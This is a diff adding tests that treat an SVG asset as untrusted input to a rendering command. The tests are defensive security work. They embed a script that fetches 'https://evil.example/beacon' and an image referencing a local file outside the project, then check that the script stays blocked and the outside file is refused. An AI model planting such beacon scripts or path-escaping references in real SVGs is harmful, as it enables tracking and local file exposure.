@@ -27,6 +27,7 @@ import {
     readIconReferencesDetailed,
 } from '../../src/cli/commands/uiRenderAsset.js';
 import type { AssetClass } from '../../src/cli/commands/uiRenderAsset.js';
+import type { Browser } from '@playwright/test';
 import { parseRegistration } from '../../src/cli/commands/uiRenderAssetCompare.js';
 import { parseElements } from '../../src/scripts/lint_svg_asset.js';
 import type { DeliveryMode } from '../../src/scripts/lint_svg_asset.js';
@@ -1109,5 +1110,63 @@ describe('seams, dark grounds and small sizes', () => {
             expect([...new Set((icon.asset?.sizes ?? []).map((s) => s.label))]).toEqual(['16', '24', '48']);
         },
         300_000,
+    );
+});
+
+describe('the asset under test is untrusted input (16.5.0 release review)', () => {
+    let browser: Browser | undefined;
+    let work: string;
+    beforeAll(async () => {
+        const { chromium } = await import('@playwright/test');
+        browser = await chromium.launch({ headless: true });
+        work = fs.mkdtempSync(path.join(os.tmpdir(), 'svg-untrusted-'));
+    }, 120_000);
+    afterAll(async () => {
+        await browser?.close();
+        if (work) fs.rmSync(work, { recursive: true, force: true });
+    });
+
+    const renderOne = async (name: string, body: string) => {
+        const { runAssetRender } = await import('../../src/cli/commands/uiRenderAsset.js');
+        const file = path.join(work, 'project', name);
+        fs.mkdirSync(path.dirname(file), { recursive: true });
+        fs.writeFileSync(
+            file,
+            `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8" role="img"><title>t</title>${body}` +
+                '<rect width="8" height="8" fill="#123"/></svg>\n',
+        );
+        const result = await runAssetRender(browser!, {
+            file,
+            projectRoot: path.join(work, 'project'),
+            outDir: path.join(work, 'out', name),
+            assetClass: 'icon',
+        });
+        return result.reading;
+    };
+
+    it(
+        'a script in the asset does not run, so it cannot reach out',
+        async () => {
+            const reading = await renderOne('script.svg', "<script>fetch('https://evil.example/beacon')</script>");
+            expect(reading.network.blocked_urls.join(' ')).not.toContain('evil.example');
+            // The readings are still taken with scripts off.
+            expect(reading.fill_ratio).not.toBeNull();
+        },
+        120_000,
+    );
+
+    it(
+        'a file: reference outside the project is blocked, one inside is not',
+        async () => {
+            fs.writeFileSync(path.join(work, 'outside.png'), Buffer.from('89504e470d0a1a0a', 'hex'));
+            const outside = `file://${path.join(work, 'outside.png')}`;
+            const reading = await renderOne('local.svg', `<image href="${outside}" width="1" height="1"/>`);
+            expect(reading.network.blocked_urls).toContain(outside);
+
+            fs.writeFileSync(path.join(work, 'project', 'inside.png'), Buffer.from('89504e470d0a1a0a', 'hex'));
+            const inner = await renderOne('local2.svg', '<image href="inside.png" width="1" height="1"/>');
+            expect(inner.network.blocked_urls.join(' ')).not.toContain('inside.png');
+        },
+        120_000,
     );
 });
